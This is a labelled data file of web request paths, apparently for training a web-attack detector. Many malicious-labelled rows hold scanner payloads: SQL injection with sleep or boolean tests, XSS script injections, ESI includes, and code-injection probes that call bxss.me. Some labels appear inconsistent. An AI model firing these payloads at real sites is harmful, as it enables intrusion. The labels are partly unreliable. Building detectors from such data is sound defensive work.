request	label
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=22538	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u4f0a\u6e05\u7f18\u9910\u5385	0
/****/rdjy/201812/t20181219_1217049.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7a46\u96c5\u658b\u65e9\u70b9\u90e8	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u82b1\u5457	0
"/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/\""javascript:void(0)\"""	1
/**********/system/2021/10/01/013459591.shtml	0
/***************/dqgg/20210427/9756.html	0
/*******/qiye/businesses-e38277_2.html?category_id=164024	0
/****/20210513/9836.html	0
/****/20210331/javascript:void(0);	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=drg\u4ed8\u8d39	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/kjybzde/gzdt/1.htm	1
/****/gfxwj/201812/t20181212_1207097.html	0
/***/0/02/00/72/2007228_050950.png	0
/******/system/2010/05/20/010126745.shtml	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u51fa\u53d1	0
/***/0/02/10/92/2109215_999112.jpg	0
"/***/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/****/mtgz/2015_mtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=-1) or 9367=9367#&perpage=1000	1
/******/ew/20170712114619701001.png	0
"/***/col19/index.html/""><script>alert(468)</script>"	1
/****/b-e814076.html	0
/****/uoerox-article-e109926269.html	0
/******/resource%' and 2*3*8=6*8 and 'u44k'!='u44k%/js/language.js	1
/****/zdlygk'||'/ncwywfgz/gys/bsj/zcwj.htm	1
/**********/system/2020/05/10/013158176.shtml	0
"/******/resource/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/jquery/jquery-latest.min.js"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6631\u987a\u8bda\u679c\u852c\u914d\u9001\u6709\u9650\u516c\u53f8	0
/*******/public.css	1
/****/zzxxgk/bmkjj/xxgkml/nynczcjd/202109/t20210929_194967.html	0
/****************/images/common/default/img_bottom_shadow.png	0
/****/mtgz/2019_mtgz/' and 'x'='y	1
/**********/system/2020/09/29/013256912.shtml	0
/****/xqdt/byq/201612/t20161214_83751_wap.html	0
/***/2019/3/12/art_31_17187.html	1
/***/tips/tipsloginsubmit.action	1
/****/20210916/javascript:void(0);	1
"/**/server-session-details.jsp?hostname=""""/>alert(777)"	1
/****/general/diary/new/submit.php	1
/****/bxss.me/ybjsqzn/list.html	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f6d\u5821\u9547\u6d77\u9f99\u7efc\u5408\u6279\u53d1\u90e8	0
/**********/system/2021/04/07/013364477.shtml	0
/***/0/00/75/28/752802_538638.jpg	1
/zwxx_11337/****/202002/t20200207_1944610.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u738b\u4e8c\u59ae\u5364\u8089\u5e97	0
/********/general/diary/new/submit.php	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5c06\u53f0\u4e61\u6d77\u71d5\u670d\u88c5\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u793e\u533a\u852c\u83dc\u76f4\u9500\u5c0f\u4efb\u679c\u4e1a\u6021\u6797\u5e97	0
"/****/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
"/************/template/'""""()&%<acx><script >f58x(9015)</script>/110105008056111/16/images/plugin/websitechange/zwdt_v3.css"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9e3f\u6607\u88c5\u9970\u6709\u9650\u516c\u53f8	0
/***/0/02/12/40/2124056_997250.jpg	0
/***/0/01/83/94/1839431_974348.jpg	0
/******/system/2016/12/22/javascript:void();	1
/*****/?loginid=10046172&stamp=1639991094399&token=81d637a487ee2a93aae8c8504551698a4f132c58&hrn=10046172	0
/******/system/more/2817030000000000/0000/2817030000000000_00000003.shtml	0
/******/public/2019/04/30/91324.images/v91324_b1556606127123_app.jpg	0
/****/bmkx/jtysj/202008/t20200805_170792.html	0
/******/rss/rssfeed.jsp?colid=34 and 5511=5511	1
/****/0914/796549.shtml	0
/**********/system/2020/09/06/013241192.shtml	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/*****/system/more/420000000000000/0001/420000000000000_00000109.shtml	0
/****/category/touzizixun	1
"/****/ccpcπ´÷⁄’æsuv◊È?page='""""()&%<acx><script >t6sh(9854)</script>"	1
"/searchfinancial.jspx?channelid=1480&producttype=2&querystr=1<esi:include src=""""http://*******/rpb.png""""/>&renew=0&termtype=0"	1
"/************/template/jcse/' 'a'.concat(70-3).concat(22*4).concat(99).concat(85).concat(115).concat(66) (require'socket'
socket.gethostbyname('hitaf' 'xnpjzolz0be83.bxss.me.')[3].to_s) '/16/images/ui.css"	1
/******/n42821/n42825/n1588869'||'/c1589219/content.html	1
/***/0/00/05/15/51519_999756.jpg	0
/****/20211109/javascript:void(0);	1
/*****/system/more/430000000000000/0001/430000000000000_00000160.shtml	0
/****/xxgkml/gfxwj/xxgkyc.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033%') or 7793=3910	1
"/****/czgk/bmjs/zzqzx/zzqzxbgt/\""javascript:void(0)\"""	1
/*****/003/004/502/00300450297_vw00000000000001_72d93be0.mp4	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(522)</script>?_=1630311501948"	1
"/***/ggfw/index.shtml/<img src=""javascript:alert(218)"">"	1
/******/system/2018/01/28/javascript:window.close();	1
/**********/system/2020/12/14/013301840.shtml	0
/zwxx_11337/****/201906/w020190628309096893947.jpg	0
/zwxx_11337/****/202002/t20200203_1939547.html	0
/**/system/2021/10/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u4e60\u5c97\u4f9b\u9500\u793e\u6c38\u80dc\u519c\u8d44\u7ecf\u9500\u90e8	0
/***/rux782.html	0
//***********/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html	1
/****/202106/t20210627_294452.html	0
/****/1022/1101.htm	0
/**********/system/2021/11/24/013484699.shtml	0
/****/system/2020/06/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total='.gethostbyname(lc('hitjl'.'owxhpxcse6f1f.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(103).chr(69).chr(116).chr(66).'&tpl=16&websiteid=110105008056111	1
/******/system/2016/08/25/012106169.shtml	0
/zwxx_11337/****/202107/t20210711_2919442.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202007/t20200709_169107.html	0
/******/bxss.me/hanweb.css	1
/**********/system/2015/02/04/011629768.shtml	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3608)"">?_=1630311970851"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19107527375955454088_1640025277892	0
/***/interface/comul_total.json.jsp?callback=jquery111103300398461009403_1640054250534	0
/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/js/news/newscontent.js	1
/**********/system/2015/12/25/011897832.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8de8\u7701\u8d8a\u754c\u91c7\u77ff	0
"/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/202103/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\u0737\ufffd\ufffd\ufffd\ufffd\u06f8\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
"/****/bysrd/201612/t20161202_79141.html?leader="""" """"a"""".concat(70-3).concat(22*4).concat(118).concat(75).concat(120).concat(79) (require""""socket""""
socket.gethostbyname(""""hitil"""" """"chgszmng9a3f7.bxss.me."""")[3].to_s) """""	1
/******/uploadpic/image/20190603/1559551096217869.jpg	0
/****/20200623/e102663596.html	0
/*****/gy42/cpgyss.asp?key=\ufffd\u0679\ufffd\ufffd\u07f2\u02f4\ufffd\ufffd\uff68\ufffd\ufffd&l2=\ufffd\u0435\ufffd&l=\ufffd\u04f1\ufffd	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u7231\u5bb6\u70df\u9152\u526f\u98df\u5546\u884c	0
/******/usercenter/index?qrcode=scanqrcode&code=021lprll22f1l84ytikl2vyua91lprls	0
/****/ysqgk/zzqzfzstsjg/index_1.html	0
/**********/system/2021/08/03/013429702.shtml	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u79b9\u5168\u660e\u997c\u5b50\u5e97	0
/**/ourbusiness/projectcontracting/201412/w020150512310540236305.jpg	0
/****/js/chunk-38c586bd.f9e03c24.js	0
/****/e142218770.html	0
/*****/gy42/ljcpgyview.asp?id=28731675&l2=\ufffd\u0d7a&l=\u027d\ufffd\ufffd	0
/**********/system/2020/03/05/013104021.shtml	0
/******/swqh/img2/5.jpg	0
/*****/image/yl.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u94f6\u7ea2\u5f00\u9501\u5e97	0
/****/myyfw/zl/201411/w020150209645793572202.jpg	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u54c6\u54aa\u54c6\u9910\u996e\u7ba1\u7406\u670d\u52a1\u4e2d\u5fc3	0
/*****/20200813/javascript:void(0);	1
"/************/template/jcse/'""""()&%<acx><script >efoq(9230)</script>/16/images/hanweb.css"	1
/****/zhjafx-syxw-e116318998.html	0
/****/qzfwj/202006/t20200603_2126557.html	0
/****/czgk/bmyjs/zzqfyxt/zzqgyzzqtlfy_1817/	0
/****/web/search?&channelid=234439&searchword=\u8017\u8680&keyword=\u8017\u8680	0
/****/shzr/cxgj/'http:/leyubet1410.com/'	0
/**********/system/2020/11/05/013278094.shtml	0
"/***/getsubject?data={""subject_id"":592,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":378747,""sign"":""""}"	0
/**************/newscenter/system/2021/12/17/013495821.shtml	0
/***/bqsm/yqlj/nbfw/ywly/zbyfyzz/gygj/gjgk/gjjj/gjjtwzq/kjcx/qyzz/xwzx/qywh/	0
/****/20180227/4528.html	0
/**********/system/2020/05/08/013157090.shtml	0
"/****/wdsjs/"""".gethostbyname(lc(""""hitts"""".""""cglllteue3abf.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(97).chr(84).chr(110).chr(82).""""/zmhdyc.html"	1
/**********/system/2021/12/19/013496636.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7ec7\u68a6\u4eba\u5e8a\u4e0a\u7528\u54c1\u7ecf\u9500\u90e8	0
"/**/ui"""" and 2*3*8=6*8 and """"tj15""""=""""tj15/lib/easyui/themes/bootstrap/messager.css"	1
/****/xxgkml/zdmsxx/xcyxdn/201807/t20180723_105900.html	0
"/***/getlist?data={""channel_id"":""12213"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/******/resource/js/news/mp4video.js	0
"/***/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/**/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqmw/	0
/**/system/2007/08/21/002186516.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtoo99chnnxbl4xeocv8zq3w=&openid=ovl7jjrd7uvu7gymdodueefljed4&outer_str=34761&activate_ticket=fdzv9emqaffrnr3xboqhb4f5ispvy1m5j62aghctuanoo8dbj5 fzedtzplsmcarob7c/bvlxukq55/htbnt/bky72ksczy3sji3qwuymji=	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u767b\u83ca\u670d\u88c5\u52a0\u5de5\u5e97	0
/****/sswkxj/ybst/index_2.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtn 9 h9jfst5hl6nahoat8q=&openid=ovl7jjqavn8c7cowszlovqnbuejg&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb/a9iquplhv/euar5vh0fnoo8dbj5 fzedtzplsmcardqc7in/s/mcolc3wz9ny8lw8gyhktjjfyixfb7pgzbs=	0
/******/if(now()=sysdate(),sleep(12),0)/js/news/newscontent.js	1
/*/public/viewclick/?addclick=-1; waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163	1
/******/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/****/wd-demo/index.php?c=prompt(777)	1
/****/web/search?channelid=222832&searchword=\u8fc5\u8fbe(\u4e2d\u56fd)\u7535\u68af\u6709\u9650\u516c\u53f8\u5b81\u590f\u5206\u516c\u53f8	0
/**********/system/2021/11/04/013475417.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zfzbjbsc	0
/****/gjzqq/' and 'x'='y	1
/****/czgk/bmyjs/zzqfyxt/sptqrmfy/index_1.html	0
/***/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66	1
/zwxx_11337/****/zcjd/202001/t20200108_1918060.html	0
/***/0/01/90/64/1906474_068910.jpg	0
/***********/zaojianpinglun/?_=1639980110326	0
/****/qzfwj/201801/t20180115_668846.html/index_1.html	0
/**********/system/more/207000000000000/0038/207000000000000_00003873.shtml	0
/****/20200923/e107258421.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u6e05\u4e30\u6e90\u6cb9\u574a	0
/**********/system/2020/05/28/013172545.shtml	0
/*******/zwgk/zfxxgk/fdzdgknr/ghxx/gmjjhshfzgh/	0
/****/ydylsdgjjt/tsydyl/index_1.html	0
/****/zjdt'||'/ghby/gzdt/1.htm	1
/****/web/search?searchword=1&channelid=287219' or 4517=4517	1
/****/bmkx/snmj/202104/t20210420_180824_wap.html	0
"/***/index.php?c=user&a="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"""	1
/**********/system/2010/02/23/010065617.shtml	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5360\u5f3a\u6c7d\u4fee\u90e8	0
/**********/system/2021/11/08/013477020.shtml	0
/******/jslib/if(now()=sysdate(),sleep(15),0)/jquery.ad-gallery2.css	1
/***/800/10/92/93/10929372_880241.jpg	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u84c9\u674e\u8bb0\u5c0f\u5403\u5e97\u77f3\u5634\u5c71\u4e07\u8fbe\u5e97	0
/****/zdlygk/ncwywfgz/zws'||'/znx/xmb_gzdxb.htm	1
/**********/system/2018/12/12/012764166.shtml	0
/******/system/2016/12/19/javascript:window.print()	1
/****/system/2017/04/05/javascript:dozoom(14)	1
/****/system/2020/12/03/javascript:window.print()	1
/****/bmkx/sgtj/201706/t20170626_91977.html	0
/****/uzjx6y-article-e110171325.html	0
/****/wdszs/zmhdyc.html	0
/****/202008/t20200810_251800.html	0
"/'""""()&%<acx><script >sm0f(9391)</script>/******/2013/list.html"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u987a\u8fbe\u901a\u642c\u5bb6\u670d\u52a1\u90e8	0
/***/2020/10/16/art_31_219934.html	0
/******/system/2021/12/21/javascript:window.close();	1
/**********/system/2021/08/09/013432585.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u8001\u5c1a\u5546\u5e97	0
"/***/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""""/>alert(777);?tested=1"	1
/******/resource/interview/room.jsp?wbinterviewid=1033%' or 6318=6318 and '%'='&owner=1707212448	1
/***/interface/comul_total.json.jsp?callback=jquery17109576489600956286_1639991057295	0
/****************/notification/negotiate?access_token=56a462cf-9b3a-4460-95e7-e63456552806	0
"/****/czgk'""""()&%<acx><script >vtjw(9973)</script>/bmjs/qtdw/"	1
/*/210514-1/index/bxss.me/t/xss.html?	1
/***/0/01/71/47/1714702_304409.jpg	0
/****/czgk/bmyjs/zzqfyxt/wzszjrmfy/201903/t20190305_1298308.html	0
/*******/qiye/b-e1699121.html	0
/**********/system/2021/11/04/javascript:void(0);	1
/*****/shtml/*****/20210416/nbfw/qtyz/yqlj/gygj/gjgk/zzjg/	0
/****/tzgg/201903/t20190311_1306701.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/http://bxss.me/t/xss.html?	1
"/****/dsp_editcreative.cfm?attributes.siteid="""">alert(777)"	1
"/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=0.6905497045448936<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/******/system/2019/06/20/012908728.shtml	0
/************/common-problem/jyxg/2017-0'xor(if(now()=sysdate(),sleep(6),0))xor'z-15/406.html	1
/******/public/2021/09/24/20210924_17c15dac32f_r1_600k.f4m	0
/****/czgk/bmjs/zzqjcyxt/ycsrmjcy/	0
/****/b-e196403.html	0
/**/system/2020/11/11/javascript:void(0);	1
/****/xxgkml/lzyj/zfgz/list.html	0
/******/usercenter/index?qrcode=quicklyrq,3,107486,10003517&code=0510csll2xt6l84wnlll2flvf330csl0	0
/****/system/2021/12/18/012231637.shtml	0
/*****/system/2020/12/01/javascript:void(0);	1
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
"/'""""()&%<acx><script >gva8(9790)</script>/*****/1088/1105/list.html"	1
//***********/bysrd/201610/t20161016_531.html	1
/zwxx_11337/****/zcjd	0
/****/b-e470653.html	0
/*******/wevvu.php	1
/***/003/002/776/00300277690_36f261c8.jpg	0
"/***/getsubject?data={""subject_id"":453,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":109044,""sign"":""""}"	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5a1f\u5a1f\u51c9\u76ae\u9ebb\u8fa3\u70eb\u5e97	0
/****/wdszs/hfsz/202112/t20211206_197413.html	0
/*/public/viewclick/?addclick=1&classid=if(now()=sysdate(),sleep(9),0)&id=270	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5929\u5b9d\u67b8\u675e\u52a0\u5de5\u5382	0
/******/css/3.css	0
/*****/system/2021/12/10/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u946b\u65fa\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8	0
/****/system/2021/08/15/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9633\u5149\u5929\u7fca\u4fbf\u5229\u5e97\u68a7\u6850\u82b1\u56ed\u5e97	0
/****/b-e563450.html	0
/****/dqgz/202005/t20200509_246903.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u9999\u9999\u5364\u8089\u9986	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202111/t20211129_197061.html	0
/****/search.jspx?q= ‰»Îπÿº¸◊÷</textarea>--><xss_77e40834db69254ee39799b622429b06/><!--<textarea>	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u6bdb\u751f\u8fde\u7efc\u5408\u5546\u5e97	0
/**/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645	1
/***/wxzcgk/202101/t20210104_2550669.html	0
/*****/gy42/ljcpgyview.asp?id=29527673&l2=\ufffd\u0d7a&l=\u027d\ufffd\ufffd	0
/****/20201204/e111643614.html	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12501,""place_id"":""fm_sp_ard"",""news_id"":""1196363""}"	0
/****/bmkx/ygjt/202102/t20210208_177484.html	0
/****/wdszs/hfsz/202109/t20210915_186670.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u8fdb\u5f55\u7535\u710a\u90e8	0
/****/wdsjs/hfswsj/202106/t20210629_184116.html	0
/****/system/2020/04/01/javascript:void();	1
/**/system/2006/10/19/000012722.shtml	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5229\u6c11\u897f\u8def\u679c\u90bb\u6c34\u679c\u5e97	0
/**/system/2007/10/15/002229169.shtml	0
/*******/	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5f66\u5170\u9992\u5934\u5e97	0
/*****/system/2011/03/16/010310519.shtml	0
/****/	1
/*******/202106/202106301224141041.html?undefined=undefined	0
/**********/system/2020/06/06/013179324.shtml	0
"/' 'a'.concat(70-3).concat(22*4).concat(118).concat(75).concat(111).concat(76) (require'socket'
socket.gethostbyname('hitwm' 'urffjzqs11013.bxss.me.')[3].to_s) '/******/list.html"	1
/*******/201905/201905231640041097.html	0
/***/mobile_h5/waparticledetail.do?article_id=202103180917351006&contenttype=article	0
/****/20201214/javascript:void(0);	1
/****/czgk/bmyjs/rmtt/gsl/202002/t20200210_1948856.html	0
/***/0/02/00/72/2007227_812849.png	0
"/**/dependencies/index?search="""">alert(/777/)"	1
/****/lkw/yw_1292/201704/t20170426_314888.html	0
/*******/qiye/b-e1972323.html	0
/****/2020wzqh/wzqh_qydt/index_1.html	0
/****/xqdt/byq/201808/w020180802368492290321.jpg	0
/***/0/02/12/39/2123980_864013.png	0
/****/jwmsxf/img/title1.png	0
/**********/system/2021/01/31/013329395.shtml	0
/**********/system/2020/11/20/013287786.shtml	0
/****/uffqgs-syxw-e106876551.html	0
/**********/system/2020/11/12/013282833.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u8431\u8431\u9ebb\u8fa3\u70eb\u5e97	0
"/**/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/*******/news.php	1
"/' 'a'.concat(70-3).concat(22*4).concat(113).concat(86).concat(104).concat(66) (require'socket'
socket.gethostbyname('hitne' 'cqvoatbv27e82.bxss.me.')[3].to_s) '/******/index.html"	1
/****/tzgg/2019_tzgg/201911/'http:/leyubet1410.com/'	0
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5ddd\u4f4f\u623f\u5efa\u8bbe\u5c40	0
/**********/system/2021/12/18/013496296.shtml	0
/****/bmkx/swjw/202002/t20200201_147011_wap.html?from=timeline	0
/****/system/2016/04/15/javascript:window.print()	1
/*******/b07s.php	1
"/*******/picture/art/index.shtml/""><script>alert(59)</script>"	1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 3900=8789 and '%'='	1
/****/gjdjbn/djbn_jthd/	1
/*/file/201902/bde97abb68f37078a352300ac6fed814.jpg	0
/***/0/02/09/39/2093956_947132.jpg	0
/zwxx_11337/****/202004/t20200430_2053894.html	0
/zwgk'||'/******/gytdsdfwzs/zzq/zcwj.htm	1
/********/actionhandler/ajax_managed_services.php	1
/***********/zaojianpinglun/?_=1640026166019	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqrlzyshbzt	0
/****/web/js/jquery-1.9.1.min.js	0
/***/index.php?c=dt&a=editor&do=design&id=289&	1
/*******/qiye/businesses-e25602_38.html?category_id=	0
/****/bmkx/jtysj/202008/t20200828_171589.html	0
/**********/system/2020/06/07/013179611.shtml	0
/zwxx_11337/****/201707/t20170727_300552.html	0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&searchid=44&tpl=16&websiteid=110105008056111	1
"/****/index.cfm?field="""">alert(777)"	1
/*****/default/files/opn-post.php	1
/*****/gywm/css/4.css	0
/******/_content/download.jsp?urltype=news.downloadattachurl) and 3311=1719#&owner=1707212448&wbfileid=51419	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqfpb/201603/t20160329_318579.html	0
/***/view/staticpags/zgh_fzbgg/gjcp/dzzb/kjcx/yfyfwpt/xxgk/zycwxx/qtyz/xwzx/zgsdt/2020_qydt/202011/t20201108_255608.html	0
/****/ysqgk/sy.html?id=62	0
/zwxx_11337/****/201707/t20170727_298450.html	0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/fit.txt?.jpg/hygq_2064/list.html	1
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=yuanchuang°Ëtpage=14&query=java	0
/****/20191022/7153.html	0
"/******/resource/js/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/jquery-latest.min.js"	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5fb7\u80dc\u9177\u7231\u5575\u5575\u9c7c	0
/***********/shangpinqihuo/heisebankuai/2021-06-16/javascript:void(0)	1
/***/login.html?status='</script><script>alert(777)</script>	1
/***/tpy/css/tpy.css	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqhtglzx/201802/t20180223_692863.html	0
/*******/202101/202101101010001027.html	0
/**********/system/2020/05/22/013167728.shtml	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4f0f\u6cfd\u852c\u83dc\u6c34\u679c\u5e97	0
/****/czgk/bmjs/zzqjcyxt/ycxjcy/201808/t20180816_978269.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4ebf\u6b63\u7535\u5b50\u5546\u52a1\u6709\u9650\u516c\u53f8	0
/***/col4304/index.html	0
/**********/system/2020/06/02/013176327.shtml	0
/****/bmkx/sgaj/201812/t20181221_112701.html	0
/****/system/2016/07/14/012055055.shtml	0
/****/ygzpxx/201812/t20181213_198700.html' and 'x'='y	1
/************/model-of-cooperation/	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4988)"">?_=1630312235646"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6210\u82f1\u5316\u5986\u54c1\u5e97	0
/***/mobile_h5/waparticledetail.do?article_id=202103140940561001&contenttype=article	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u71d5\u513f\u5e72\u679c\u5e97	0
/zzsl'||'/******/202107/t20210723_2938511.html	1
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12529}"	0
